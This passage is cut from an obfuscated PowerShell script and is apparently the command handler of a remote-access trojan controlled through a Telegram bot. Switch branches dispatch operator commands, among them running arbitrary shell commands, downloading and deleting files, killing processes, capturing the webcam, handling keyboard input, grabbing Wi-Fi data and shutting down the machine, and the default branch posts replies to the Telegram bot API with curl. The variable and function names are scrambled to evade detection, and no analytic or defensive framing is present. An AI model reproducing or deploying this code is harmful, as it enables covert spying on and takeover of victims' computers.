				$foaabVokhwmhwYGctiNgyNqlUgsnwsUznNPmsU = ($NQERfnFPKXOhlZFhhLhXBlFjJxpIHeN -split ("/cdDir $bKAuAnFkwqYrPZsOBQFOvVExPvTsHTgOkj "))[1]
				EHYvzAwnUcBgYgPKrhTaliIxIiQdkyxQbifONGExZRGeg $foaabVokhwmhwYGctiNgyNqlUgsnwsUznNPmsU
			}	
			"/delete $bKAuAnFkwqYrPZsOBQFOvVExPvTsHTgOkj *"  {
				$JbJjAJYOynRSNfuvNCLBLEMhKLA = ($NQERfnFPKXOhlZFhhLhXBlFjJxpIHeN -split ("/delete $bKAuAnFkwqYrPZsOBQFOvVExPvTsHTgOkj "))[1]
				eMhWchCgjJwtmvGyCVAdFOfqsJxBkzZTrgJgJfVyxJk $JbJjAJYOynRSNfuvNCLBLEMhKLA
			}	
			"/taskkill $bKAuAnFkwqYrPZsOBQFOvVExPvTsHTgOkj *"  {
				$NBJFHfwIjcbTMhIncutVzcBNNxSSyOKdqBHH = ($NQERfnFPKXOhlZFhhLhXBlFjJxpIHeN -split ("/taskkill $bKAuAnFkwqYrPZsOBQFOvVExPvTsHTgOkj "))[1]
				MftWsYDUfsfoFRgrXrEAjPqZQqiToBxfjCRwduXw $NBJFHfwIjcbTMhIncutVzcBNNxSSyOKdqBHH
			}	
			"/logoff $bKAuAnFkwqYrPZsOBQFOvVExPvTsHTgOkj"  {
				JbkuWbwPFCyIWIXrSZYORkfStuOweiLjMOdqY
			}	
			"/shutdown $bKAuAnFkwqYrPZsOBQFOvVExPvTsHTgOkj"  {
				BBqigsQKcZoynxTyvkTSf
			}	
			"/restart $bKAuAnFkwqYrPZsOBQFOvVExPvTsHTgOkj"  {
				tKpXkifxjpmKkSvGSzXUKVc
			}	
			"/wifi $bKAuAnFkwqYrPZsOBQFOvVExPvTsHTgOkj"  {
				ibDyDguyKLInUzEVQaLwDkqWcFiVvqSfGGoMcG
			}
			"/offScreen $bKAuAnFkwqYrPZsOBQFOvVExPvTsHTgOkj"  {
				bqxqasdWKxPQYHMEcBWxFmPBSQMzHxHDaOZ 
			}
			"/cdrom $bKAuAnFkwqYrPZsOBQFOvVExPvTsHTgOkj"  {
				NhZbNvhgDBKTxZhSOuSo 
			}
			"/cmd $bKAuAnFkwqYrPZsOBQFOvVExPvTsHTgOkj *"  {
				$RQcOLqqNHfMTZViMBdTqCo = ($NQERfnFPKXOhlZFhhLhXBlFjJxpIHeN -split ("/cmd $bKAuAnFkwqYrPZsOBQFOvVExPvTsHTgOkj "))[1]
				dQzukVThZTliIzcgZCraAB $RQcOLqqNHfMTZViMBdTqCo 
			}
			"/open $bKAuAnFkwqYrPZsOBQFOvVExPvTsHTgOkj *"  {
				$qMDqlXdQRaehxIVCZbzoHfdOf = ($NQERfnFPKXOhlZFhhLhXBlFjJxpIHeN -split ("/open $bKAuAnFkwqYrPZsOBQFOvVExPvTsHTgOkj "))[1]
				CxMxaCQIaqvwTEyHPOCHaefrFlYUEpwAGGjFpgoczi $qMDqlXdQRaehxIVCZbzoHfdOf
			}
			"/cleanAll $bKAuAnFkwqYrPZsOBQFOvVExPvTsHTgOkj" {
				xUExxfroeAPoIbZgFUZCNCCowVNNvdmWHzmS
			}
			"/download $bKAuAnFkwqYrPZsOBQFOvVExPvTsHTgOkj *"{
				$hypDTzAtjKvJPDkFtsClkoWml = ($NQERfnFPKXOhlZFhhLhXBlFjJxpIHeN -split ("/download $bKAuAnFkwqYrPZsOBQFOvVExPvTsHTgOkj "))[1]
				MXAhjaoxDIqzWgnPrRsozWf $hypDTzAtjKvJPDkFtsClkoWml
			}
			"/webcam $bKAuAnFkwqYrPZsOBQFOvVExPvTsHTgOkj"{
				dPssHGOdwbOxwwtCmefYmlgAChuRU
			}
			"/keyboard $bKAuAnFkwqYrPZsOBQFOvVExPvTsHTgOkj *"  {
				$xHydCqxwwpbyXFHdeqfZymMYulomwkBQtvMZTSHYdwM = ($NQERfnFPKXOhlZFhhLhXBlFjJxpIHeN -split ("/keyboard $bKAuAnFkwqYrPZsOBQFOvVExPvTsHTgOkj "))[1]
				yjPLDqqZJczLmZnRyxbDSbpwFbzeMwepWJDbSjxP $xHydCqxwwpbyXFHdeqfZymMYulomwkBQtvMZTSHYdwM
			}
			default  {
				# . Nnfi r dsvngihrcgjd b n
				$bgNMXPNknuPNlPztrREaeWoVwYWAVincEDNF = "Sorry $($iMVuZrVlIAdAjENuQTTPTdGowcLIpKeIBaGg.Message.from.first_name), but I don't understand ""$($NQERfnFPKXOhlZFhhLhXBlFjJxpIHeN)""!"
				curl -s -X POST https://api.telegram.org/bot$($GTqQlFDOiGFZLxCqnSIigU)/sendMessage -d chat_id=$kGGqqJUnVTVovHElfnBtDffVExhtI -d text=$bgNMXPNknuPNlPztrREaeWoVwYWAVincEDNF
			}
		  }}
	}
}